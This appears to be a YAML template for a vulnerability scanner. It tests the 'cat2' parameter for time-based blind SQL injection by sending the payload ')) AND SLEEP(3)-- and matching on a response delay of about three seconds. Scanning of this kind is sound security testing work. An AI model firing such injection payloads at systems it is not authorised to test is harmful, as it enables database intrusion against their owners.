id: sqli-time3-197
name: 'Delay probe in cat2'
severity: high
type: active
tags:
  - sqli
  - injection
  - blind
  - time
description: '3-second delay via cat2'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      cat2:
        - ''')) AND SLEEP(3)--'
    matchers:
      - type: time
        ms: 2500
